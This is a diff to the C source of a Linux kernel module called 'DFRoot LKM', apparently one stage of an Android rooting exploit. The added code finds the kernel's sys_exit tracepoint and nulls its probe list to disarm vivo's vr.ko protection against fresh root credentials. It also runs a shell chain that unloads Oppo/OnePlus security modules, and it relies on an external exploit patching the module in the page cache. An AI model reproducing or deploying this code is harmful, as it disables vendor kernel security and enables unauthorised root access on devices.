@@ -9,6 +9,14 @@
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("DFRoot LKM");
 
+/* W1c: disarm vivo's vr.ko sys_exit tracepoint probe. exp.c scans the module
+ * image for DF_VR_MAGIC right before writing it into the page cache and
+ * patches df_vr_cfg[1] with the funcs offset inside struct tracepoint
+ * (device-specific, parsed from GhostLock / kernel image). Offset 0 = the
+ * stage is off and the probe is left alone. volatile: written externally. */
+#define DF_VR_MAGIC 0xDFC0FF16DFC0FF16ULL
+volatile unsigned long df_vr_cfg[2] = { DF_VR_MAGIC, 0 };
+
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                              void *init, void *cleanup, void *data);
@@ -43,6 +51,7 @@ static int __nocfi __init dfroot_init(void)
     struct kprobe kln_kp;
     void *info;
     int ret;
+    const char *vr_marker = "";
 
     // UMH command to run. The three rmmod calls are Oppo/OnePlus only and fail
     // on every other kernel, and `sh -c` returns the exit code of the LAST
@@ -51,13 +60,12 @@ static int __nocfi __init dfroot_init(void)
     // trailing `exit 0` is what makes the helper report success everywhere.
     static const char sh[] = "/system/bin/sh";
     static char *envp[] = { "PATH=/system/bin", NULL };
-    static char *argv[] = { (char *)sh, "-c",
-        "touch /dev/dfm0;"
-        " rmmod oplus_secure_harden 2>/dev/null;"           //
-        " rmmod oplus_security_keventupload 2>/dev/null;"   // Oppo/OnePlus
-        " rmmod oplus_security_guard 2>/dev/null;"          //
-        " exit 0",
-        NULL };
+    // W1c result marker gets appended to the helper chain; the app's log
+    // poller picks /dev/dfvr0 and /dev/dfvre up like every other /dev/df*
+    // node. /dev is tmpfs, so markers never survive a reboot - same lifetime
+    // rules as the dfm* markers.
+    static char cmd[256];
+    static char *argv[] = { (char *)sh, "-c", cmd, NULL };
 
     // Symbol finder
     kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
@@ -111,7 +119,39 @@ static int __nocfi __init dfroot_init(void)
     else
         pr_info("dfroot: task_defex_user_exec hooked\n");
 
+    // W1c: zero __tracepoint_sys_exit->funcs so vivo's vr.ko exit probe (which
+    // kills tasks with fresh root creds) never fires again. Pure data write -
+    // no hooks, no callbacks - same semantics as GhostLock's W1c stage. Runs
+    // right before the UMH/bootstrap/ksud chain, i.e. before anything with
+    // fresh root creds is spawned (提权 -> Root -> 用Root改 -> 拉起管理器).
+    // The funcs offset is device-specific (user-supplied); 0 = stage off.
+    if (READ_ONCE(df_vr_cfg[1])) {
+        char *tp = (char *)get_addr("__tracepoint_sys_exit");
+        if (!tp) {
+            pr_warn("dfroot: W1c __tracepoint_sys_exit missing, vr intact\n");
+            vr_marker = " touch /dev/dfvre;";
+        } else {
+            void **funcs_slot = (void **)(tp + READ_ONCE(df_vr_cfg[1]));
+            if (READ_ONCE(*funcs_slot)) {
+                WRITE_ONCE(*funcs_slot, NULL);
+                pr_info("dfroot: W1c vr sys_exit probe disarmed (funcs=NULL, off=%lu)\n",
+                        READ_ONCE(df_vr_cfg[1]));
+            } else {
+                pr_info("dfroot: W1c vr sys_exit funcs already NULL\n");
+            }
+            vr_marker = " touch /dev/dfvr0;";
+        }
+    }
+
     // Run UMH command
+    snprintf(cmd, sizeof(cmd),
+        "touch /dev/dfm0;"
+        " rmmod oplus_secure_harden 2>/dev/null;"           //
+        " rmmod oplus_security_keventupload 2>/dev/null;"   // Oppo/OnePlus
+        " rmmod oplus_security_guard 2>/dev/null;"          //
+        "%s"
+        " exit 0",
+        vr_marker);
     umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
     umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
     if (!umh_setup || !umh_exec) {
